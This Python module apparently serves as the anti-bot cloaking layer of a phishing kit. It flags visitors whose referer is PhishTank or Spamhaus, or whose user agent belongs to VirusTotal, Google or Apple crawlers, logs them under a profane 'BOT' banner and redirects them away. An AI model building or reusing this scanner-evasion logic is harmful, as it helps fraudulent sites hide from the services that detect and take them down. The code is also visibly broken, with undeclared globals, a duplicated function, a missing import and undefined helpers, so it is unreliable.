import re
from urllib.parse import urlparse

import requests
from core.Bots.blockeds.bot_patterns import bot_patterns_REMOTE_ADDR
from core.Bots.blockeds.user_agents import bot_keywords_USER_AGENTS
from core.Bots.blockeds.hostnames import bot_patterns_HOSTNAME
from core.Bots.blockeds.shit_isps import bot_keywords_SHIT_ISPS
from core.Bots.blockeds.blocked_referer import bot_BLOCKED_REFERERS


bot_count = 0


def check_bot_REMOTE_ADDR_count(REMOTE_ADDR):

    if REMOTE_ADDR in bot_patterns_REMOTE_ADDR:
        bot_count += 1
    else:
        for pattern in bot_patterns_REMOTE_ADDR:
            if re.match(pattern, REMOTE_ADDR):
                bot_count += 1

    return bot_count


import socket


def get_hostname_by_ip(ip):
    """Get the hostname for a given IP address."""
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except socket.herror:
        hostname = ""
    return hostname


def check_bot_in_hostname(hostname):
    """Check if the hostname contains any known bot-related substrings."""

    for bot in bot_patterns_HOSTNAME:
        if bot.lower() in hostname.lower():
            bot_count += 1

    return bot_count


def check_for_bots(user_agent):
    """Check if the user agent contains known bot-related keywords."""
    if not user_agent or user_agent in ["", " ", "\t"]:
        return 0  # Treat invalid user agents as having no bot presence

    user_agent = user_agent.lower()  # Convert user agent to lowercase
    bot_count = sum(
        1 for keyword in bot_keywords_USER_AGENTS if keyword.lower() in user_agent
    )

    return bot_count


def check_isp_for_bots(user_ip=None):
    """Check if the ISP belongs to known suspicious ISPs and increment bot count."""

    # Default IP if no IP is provided
    ipp = user_ip if user_ip and user_ip != "" else "1.1.1.1"

    try:
        # Fetch ISP information from ipinfo.io
        response = requests.get(f"http://ipinfo.io/{ipp}/org")
        ISP = response.text.strip()

        if not ISP:
            return "ppp"  # Return if no ISP data is found

        # Initialize bot count
        bot_count = 0

        # Check if ISP matches any suspicious ISPs
        for isp in bot_keywords_SHIT_ISPS:
            if (
                isp.lower() in ISP.lower()
            ):  # Check if ISP is in the list (case-insensitive)
                bot_count += 1

        return bot_count

    except requests.RequestException:
        return "ppp"  # Return if there's any error in the HTTP request


def check_referer_for_bots(http_referer):

    # Check if referer is set and not empty // google.com
    if http_referer:
        # Parse the referer URL to get the host
        parsed_referer = urlparse(http_referer)
        referer_host = parsed_referer.hostname

        # Check if the referer matches any known bad referer URLs
        if referer_host == "phishtank.com":
            bot_count += 1
        elif referer_host == "www.phishtank.com":
            bot_count += 1
        elif referer_host == "www.spamhaus.org":
            bot_count += 1
        elif referer_host == "www.spamhaus.com":
            bot_count += 1
        elif referer_host in bot_BLOCKED_REFERERS:
            bot_count += 1

    return bot_count





def check_user_agent_for_bots(user_agent):
    """Check if the user agent matches specific known bot user agents."""
    bot_count = 0

    # List of known bot user agents
    known_bots = [
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
    ]
    
    # Check if the user agent matches any known bot user agents
    if user_agent in known_bots:
        bot_count += 1

    return bot_count




def check_user_agent_for_bots(user_agent):
    """Check if the user agent contains any known bot-related keywords."""
    bot_keywords = [
        'google', 'Java', 'FreeBSD', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker',
        'Googlebot', 'bingbot', 'crawler', 'PycURL', 'facebookexternalhit',
        'Virustotal', 'Spamhaus'
    ]
    
    bot_count = 0
    if user_agent:
        for keyword in bot_keywords:
            if keyword.lower() in user_agent.lower():  # Case-insensitive check
                bot_count += 1
    
    return bot_count







def log_bot_details(bot_count, ip, user_agent, settings):
    if bot_count != 0:
        # Get the current date and time
        date = datetime.datetime.now().strftime("%I:%M:%S %d/%m/%Y")
        
        # Get the OS and Browser (you can define these functions as needed)
        os_info = get_os(user_agent)
        browser_info = get_browser(user_agent)
        
        # Create the log message
        message = f"+++++[ BOT - Fucker.py ]+++++\n"
        message += f"IP         : {ip}\n"
        message += f"OS         : {os_info}\n"
        message += f"Browser    : {browser_info}\n"
        message += f"User-Agent : {user_agent}\n"
        message += f"+++++[ ######### ]+++++\n\n"
        
        # Write the message to a log file
        with open("./Logs/botlogs.txt", "a+") as log_file:
            log_file.write(message)
        
        # Redirect the user (This could be a URL redirect in a web framework like Flask)
        redirect_url = f"https://href.li/?https://www.google.com/search?q={settings['out']}"
        return redirect_url
    


from user_agents import parse






def get_user_browser(request):
    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
    user_agent_info = parse(user_agent)
    
    # Extract browser
    browser = user_agent_info.browser.family
    
    return browser

def get_user_os(request):
    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
    user_agent_info = parse(user_agent)
    
    # Extract OS
    os = user_agent_info.os.family
    
    return os